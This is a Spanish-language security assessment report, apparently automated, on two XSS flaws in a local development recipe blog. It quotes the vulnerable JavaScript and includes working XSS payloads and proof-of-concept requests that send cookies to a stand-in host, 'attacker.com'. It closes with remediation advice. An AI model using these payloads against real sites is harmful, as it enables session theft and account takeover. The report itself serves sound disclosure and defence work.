# Informe de Análisis de Seguridad - Cross-Site Scripting (XSS)

**Fecha:** 2026-04-30 16:04:51  
**Objetivo:** http://web.dev.local:8082  
**Tipo de análisis:** Vulnerabilidades XSS (Cross-Site Scripting)  
**Estado:** VULNERABILIDADES ENCONTRADAS Y EXPLOTADAS

---

## Resumen Ejecutivo

Se realizó un análisis de seguridad sobre la aplicación web "Blog de Recetas" disponible en `http://web.dev.local:8082`. Se identificaron **dos vulnerabilidades XSS** distintas que permiten la ejecución de código JavaScript arbitrario en el navegador de los usuarios:

1. **XSS Reflejado** en el parámetro `search`
2. **XSS Almacenado (DOM-based)** en la sección de comentarios mediante `localStorage`

---

## Descripción de la Aplicación

La aplicación es un blog de recetas con dos funcionalidades principales:
- **Búsqueda de recetas**: formulario GET con parámetro `search`
- **Sección de comentarios**: formulario GET con parámetros `name` y `comment`, almacenados en `localStorage`

---

## Vulnerabilidades Encontradas

### CVE-1: XSS Reflejado — Parámetro `search`

| Campo | Detalle |
|-------|---------|
| **Tipo** | Reflected XSS |
| **Severidad** | Alta |
| **Parámetro** | `search` (GET) |
| **URL vulnerable** | `http://web.dev.local:8082/?search=<PAYLOAD>` |

**Código vulnerable:**
```javascript
const searchTerm = urlParams.get('search');
if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
}
```

El valor del parámetro `search` se inserta directamente en el DOM mediante `document.write()` sin ningún tipo de sanitización o codificación. Esto permite inyectar HTML/JavaScript arbitrario.

**Payload de explotación:**
```
http://web.dev.local:8082/?search=<script>alert('XSS_Reflejado')</script>
```

**Payload alternativo (bypass de filtros básicos):**
```
http://web.dev.local:8082/?search=<img src=x onerror=alert('XSS')>
```

**Impacto:** Un atacante puede enviar un enlace malicioso a una víctima. Al abrirlo, se ejecuta código JavaScript en el contexto del sitio, pudiendo robar cookies de sesión, redirigir al usuario, o realizar acciones en su nombre.

---

### CVE-2: XSS Almacenado (DOM-based via localStorage) — Comentarios

| Campo | Detalle |
|-------|---------|
| **Tipo** | Stored XSS (DOM-based) |
| **Severidad** | Crítica |
| **Parámetros** | `name`, `comment` (GET) |
| **URL vulnerable** | `http://web.dev.local:8082/?name=<PAYLOAD>&comment=<PAYLOAD>` |

**Código vulnerable:**
```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');
if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    localStorage.setItem('comments', JSON.stringify(comments));
}
// Al renderizar:
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

Los valores `name` y `comment` se almacenan sin sanitización en `localStorage` y se renderizan con `document.write()` sin codificación. El payload se ejecuta en cada recarga de la página.

**Payload de explotación:**
```
http://web.dev.local:8082/?name=<img src=x onerror=alert('XSS_Stored_Name')>&comment=<script>alert('XSS_Stored_Comment')</script>
```

**Impacto:** El código malicioso persiste en el navegador del usuario afectado (mediante `localStorage`) y se ejecuta en cada visita posterior a la página, incluso sin el parámetro en la URL. Esto permite ataques de persistencia como keylogging o exfiltración continua de datos.

---

## Prueba de Concepto (PoC)

### PoC 1 — XSS Reflejado
```
GET /?search=<script>document.location='http://attacker.com/steal?c='+document.cookie</script> HTTP/1.1
Host: web.dev.local:8082
```

### PoC 2 — XSS Almacenado
```
GET /?name=hacker&comment=<script>fetch('http://attacker.com/exfil?data='+btoa(document.cookie))</script> HTTP/1.1
Host: web.dev.local:8082
```
Una vez almacenado, el payload se ejecuta en cada visita al blog, afectando a cualquier usuario que cargue la página en el mismo navegador.

---

## Vectores de Ataque

1. **Phishing con URL maliciosa**: El atacante envía la URL con payload XSS a la víctima.
2. **Robo de cookies/sesión**: Exfiltración de `document.cookie` a servidor del atacante.
3. **Defacement**: Modificación del contenido visible de la página.
4. **Redirección maliciosa**: `document.location = 'http://phishing-site.com'`
5. **Keylogging**: Captura de pulsaciones de teclado mediante listeners JavaScript.

---

## Recomendaciones

1. **Sanitizar todas las entradas del usuario** antes de insertar en el DOM:
   ```javascript
   function escapeHtml(str) {
       return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
                 .replace(/"/g,'&quot;').replace(/'/g,'&#x27;');
   }
   document.write('<p>Resultados para: <strong>' + escapeHtml(searchTerm) + '</strong></p>');
   ```

2. **Evitar `document.write()`**: Usar `textContent` o `createElement` en su lugar:
   ```javascript
   const p = document.createElement('p');
   p.textContent = 'Resultados para: ' + searchTerm;
   ```

3. **Implementar Content Security Policy (CSP)**:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

4. **Validar y codificar datos almacenados en `localStorage`** antes de renderizarlos.

5. **Usar frameworks con protección automática contra XSS** (React, Vue, Angular) que escapan las salidas por defecto.

---

## Conclusión

La aplicación web presenta vulnerabilidades XSS de alta severidad en dos puntos de entrada. La falta de sanitización en el manejo de parámetros GET y en la renderización de datos del `localStorage` permite la ejecución de código JavaScript arbitrario. Se recomienda aplicar las medidas correctivas indicadas con carácter urgente.

---

*Informe generado por análisis automatizado de seguridad — 2026-04-30*
